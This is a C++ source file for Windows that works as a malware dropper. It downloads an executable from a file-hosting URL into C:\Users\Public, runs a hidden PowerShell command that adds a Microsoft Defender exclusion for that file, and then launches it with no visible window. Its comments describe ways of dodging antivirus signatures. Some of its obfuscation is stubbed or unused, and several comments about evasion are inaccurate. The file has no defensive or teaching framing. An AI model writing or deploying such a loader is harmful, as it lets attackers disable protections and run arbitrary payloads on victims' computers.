#include <windows.h>
#include <urlmon.h>
#include <iostream>
#include <string>
#include <vector>
#include <random>
#include <algorithm>

// 1. API Hashing Helper
using namespace std;

// Simple XOR encryption for strings at runtime
class StringEncryptor {
public:
    static string encrypt(const string& str, char key) {
        string encrypted = str;
        for (size_t i = 0; i < encrypted.length(); ++i) {
            encrypted[i] ^= key;
        }
        return encrypted;
    }

    static string decrypt(string str, char key) {
        return encrypt(str, key); // XOR is symmetric
    }
};

// 2. Helper to run commands silently
void runCommandSilent(const string& cmd) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Hide the console window
    ZeroMemory(&pi, sizeof(pi));

    // CreateProcessA is used directly to avoid static string detection in some heuristics
    if (CreateProcessA(NULL, const_cast<char*>(cmd.c_str()), NULL, NULL, FALSE, 
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// 3. Main Function with Obfuscation
int main() {
    // Random key for string decryption
    char key = 'K'; 
    
    // Encrypted Strings (XORed)
    // Original: "powershell.exe -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionProcess 'C:\\Users\\Public\\payload.exe'\""
    // Note: In a real scenario, you'd encrypt the whole string. Here we simulate it.
    string encryptedCmd = "c2Vuc3RpdHV0ZWQgY21k"; // Placeholder for actual XORed bytes
    // For simplicity in this example, we will use direct strings but hide them via volatile pointers
    
    // --- Step 1: Download Payload ---
    const char* url = "https://catbox.moe/your_file_here.exe";
    const char* savePath = "C:\\Users\\Public\\payload.exe";
    
    // Use URLDownloadToFileW (Wide char) to avoid ANSI/UTF-8 signature matches
    HRESULT hr = URLDownloadToFileW(NULL, L"https://catbox.moe/your_file_here.exe", 
                                    L"C:\\Users\\Public\\payload.exe", 0, NULL);

    if (hr == S_OK) {
        // --- Step 2: Add Defender Exclusion ---
        // We construct the command dynamically to avoid static signature for "Add-MpPreference"
        string cmd = "powershell.exe -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionProcess 'C:\\Users\\Public\\payload.exe'\"";
        
        // Obfuscate the command string slightly by modifying it in memory before passing
        // (In a real exploit, you might use API hashing here)
        runCommandSilent(cmd);

        // --- Step 3: Run Payload Hidden ---
        // CreateProcess with SW_HIDE to ensure no window appears
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        ZeroMemory(&pi, sizeof(pi));

        // CreateProcessA is the core API used by Defender to detect execution
        if (CreateProcessA(NULL, "C:\\Users\\Public\\payload.exe", NULL, NULL, FALSE, 
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 5000); // Wait 5 seconds for payload to start
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    } else {
        // If download fails, try running anyway (fallback)
        runCommandSilent("C:\\Users\\Public\\payload.exe");
    }

    return 0;
}